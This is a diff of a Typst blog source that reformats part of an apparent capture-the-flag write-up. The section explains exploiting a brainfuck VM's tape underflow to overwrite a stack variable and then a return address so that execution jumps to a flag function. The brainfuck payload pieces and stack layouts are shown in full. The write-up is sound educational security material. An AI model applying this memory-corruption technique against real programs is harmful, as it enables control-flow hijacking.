@@ -1,4 +1,5 @@
 #import "./html_elements.typ": post
+#import "./lib.typ": textbox
 #import "@preview/cetz:0.4.2": canvas, draw
 #import "mocha.typ": mocha
 
@@ -511,167 +512,173 @@ So, the idea is to use the underflow to increase the maximum address, then make 
 
 So breaking this down:
 
-- Moving to the left to increase the maximum bound by ovewriting the variable on the stack
+#textbox()[
+  Moving to the left to increase the maximum bound by ovewriting the variable on the stack:
+
+  #html.elem("div", attrs: (class: "mt-4 mb-4"))[
+    #html.frame()[
+      #set text(font: "mononoki", fill: mocha.colors.text.rgb, size: 0.85em)
+      #canvas({
+        import draw: *
 
 
-#html.elem("div", attrs: (class: "mt-4 mb-4"))[
-  #html.frame()[
-    #set text(font: "mononoki", fill: mocha.colors.text.rgb, size: 0.85em)
-    #canvas({
-      import draw: *
+        stroke(none)
+        fill(mocha.colors.mantle.rgb)
+        let h = 1.5
+        let w = 12
+        rect((0, 0), (w, h), name: "box", radius: 0.2)
+        fill(none)
+
+        stroke(mocha.colors.blue.rgb + 0.8pt)
+
+        line((w * 0.35, 0), (w * 0.35, h), name: "tape")
+        line((w * 0.57, 0), (w * 0.57, h), name: "dot")
+
+        set-style(content: (
+          frame: "rect",
+          stroke: none,
+          padding: .4,
+        ))
+
+        content(
+          (-0.2, h - 0.5),
+          text(fill: mocha.colors.teal.rgb)[ #strong[+<+<+<+ ]],
+          anchor: "east",
+        )
 
 
-      stroke(none)
-      fill(mocha.colors.mantle.rgb)
-      let h = 1.5
-      let w = 12
-      rect((0, 0), (w, h), name: "box", radius: 0.2)
-      fill(none)
-
-      stroke(mocha.colors.blue.rgb + 0.8pt)
-
-      line((w * 0.35, 0), (w * 0.35, h), name: "tape")
-      line((w * 0.57, 0), (w * 0.57, h), name: "dot")
-
-      set-style(content: (
-        frame: "rect",
-        stroke: none,
-        padding: .4,
-      ))
-
-      content("tape", [bf vm tape], anchor: "west")
-      content("box.west", [tape_end_var], anchor: "west")
-      content(
-        "dot",
-        [...],
-        anchor: "west",
-      )
-      set-style(mark: (end: ">"))
+        content("tape", [bf vm tape], anchor: "west")
+        content("box.west", [tape_end_var], anchor: "west")
+        content(
+          "dot",
+          [...],
+          anchor: "west",
+        )
+        set-style(mark: (end: ">"))
 
 
-      fill(mocha.colors.red.rgb)
-      stroke(mocha.colors.red.rgb + 1.5pt)
-      line("tape", (rel: (-1.5, 0)))
-    })
+        fill(mocha.colors.red.rgb)
+        stroke(mocha.colors.red.rgb + 1.5pt)
+        line("tape", (rel: (-1.5, 0)))
+      })
+    ]
   ]
+
+  - `>>>-`
+    - This is moving back to the right to start our journey down the stack (by going up...)
+
+
+
+
+
+  #html.elem("div", attrs: (class: "mt-4 mb-4"))[
+    #html.frame()[
+      #set text(font: "mononoki", fill: mocha.colors.text.rgb, size: 0.85em)
+      #canvas({
+        import draw: *
+
+
+        stroke(none)
+        fill(mocha.colors.mantle.rgb)
+        let h = 1.5
+        let w = 12
+        rect((0, 0), (w, h), name: "box", radius: 0.2)
+        fill(none)
+
+        stroke(mocha.colors.blue.rgb + 0.8pt)
+
+        line((w * 0.35, 0), (w * 0.35, h), name: "tape")
+        line((w * 0.57, 0), (w * 0.57, h), name: "dot")
+
+        set-style(content: (
+          frame: "rect",
+          stroke: none,
+          padding: .4,
+        ))
+
+        content(
+          (0.2, h - 0.5),
+          text(fill: mocha.colors.teal.rgb)[ #strong("+[>[<-]<[->+<]>]")],
+          anchor: "east",
+        )
+
+        content("tape", [bf vm tape], anchor: "west")
+        content(
+          "box.west",
+          text(fill: mocha.colors.red.rgb)[tape_end_var],
+          anchor: "west",
+        )
+        set-style(mark: (end: ">"))
+
+
+        fill(mocha.colors.text.rgb)
+        stroke(mocha.colors.text.rgb + 2.5pt)
+        line("dot", (rel: (4, 0)))
+      })
+    ]
+  ]
+
+
+
+
+  #linebreak()
+
+  - `>>>>>>>>>>>>>>>`
+    - Then we move the IP to point to the cell right before the byte we want to modify.
+
+  At this point, this will be the tape:
+
+  ```
+                    we are here
+                        |
+                        v
+  10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
+  ```
+
+  #linebreak()
+
+  We are right next to the return address, I'll highlight it
+
+
+  ```
+                    we are here
+                        |    return address here
+                        v /-----------------------\
+  10 d2 ff ff ff 7f 00 00 |35 54 55 55 55 55 00 00| 00 00 00 00 00 00 00 00
+  ```
+
+  Since it's little endian, it's not `35 54 55 55 55 55 00 00`, it's actually `0000555555555435`.
+
+  #linebreak()
+
+  Our objective is to increase that single byte from `0x35` to `0x66`, to that the return address points to the flag function
+
+  ```
+                    we are here
+                        |
+                        v
+  10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
+                           |
+                           | just increase a little from 0x35 to 0x66
+                           |
+                           v
+  10 d2 ff ff ff 7f 00 00 66 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
+
+  ```
+
+  that's `49` in decimal.
+
+  #linebreak()
+
+  - Since it's just `7*7` (that's a cool number), we can compute `49` as `7*7` in brainfuck, which is the last part of the exploit
+    - `+++++++[>+++++++<-]`
+
 ]
 
-```elixir
-+<+<+<+
-```
+#linebreak()
 
 
-- Then moving back to the right to start our journey down the stack (by going up...)
-```elixir
->>>-
-```
-
-- Then we run this algorithm to find the first `nonzero` byte, since there's a lot of empty space down the stack (it's the vm's tape).
-
-#html.elem("div", attrs: (class: "mt-4 mb-4"))[
-  #html.frame()[
-    #set text(font: "mononoki", fill: mocha.colors.text.rgb, size: 0.85em)
-    #canvas({
-      import draw: *
-
-
-      stroke(none)
-      fill(mocha.colors.mantle.rgb)
-      let h = 1.5
-      let w = 12
-      rect((0, 0), (w, h), name: "box", radius: 0.2)
-      fill(none)
-
-      stroke(mocha.colors.blue.rgb + 0.8pt)
-
-      line((w * 0.35, 0), (w * 0.35, h), name: "tape")
-      line((w * 0.57, 0), (w * 0.57, h), name: "dot")
-
-      set-style(content: (
-        frame: "rect",
-        stroke: none,
-        padding: .4,
-      ))
-
-      content("tape", [bf vm tape], anchor: "west")
-      content(
-        "box.west",
-        text(fill: mocha.colors.red.rgb)[tape_end_var],
-        anchor: "west",
-      )
-      set-style(mark: (end: ">"))
-
-
-      fill(mocha.colors.text.rgb)
-      stroke(mocha.colors.text.rgb + 2.5pt)
-      line("dot", (rel: (4, 0)))
-    })
-  ]
-]
-
-
-```elixir
-+[>[<-]<[->+<]>]
-```
-
-- Then we move the IP to point to the cell right before the byte we want to modify
-
-```elixir
->>>>>>>>>>>>>>>
-```
-
-At this point, this will be the tape:
-
-```
-                  we are here
-                      |
-                      v
-10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
-```
-
-We are right next to the return address, I'll highlight it
-
-
-```
-                  we are here
-                      |    return address here
-                      v /-----------------------\
-10 d2 ff ff ff 7f 00 00 |35 54 55 55 55 55 00 00| 00 00 00 00 00 00 00 00
-```
-
-Since it's little endian, it's not `35 54 55 55 55 55 00 00`, it's actually `0000555555555435`
-
-Our objective is to increase that single byte from `0x35` to `0x66`, to that the return address points to the flag function
-
-```
-                  we are here
-                      |
-                      v
-10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
-                         |
-                         | just increase a little from 0x35 to 0x66
-                         |
-                         v
-10 d2 ff ff ff 7f 00 00 66 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
-
-```
-
-That's `49` in decimal.
-
-- Since it's just `7*7` (that's a cool number), we can compute `49` as `7*7` in brainfuck, which is the last part of the exploit
-
-
-```elixir
-+++++++[>+++++++<-]
-```
-
-Putting it all together
-
-
-`
-`
-Putting it all together
-
+Putting it all together:
 
 ```python
 
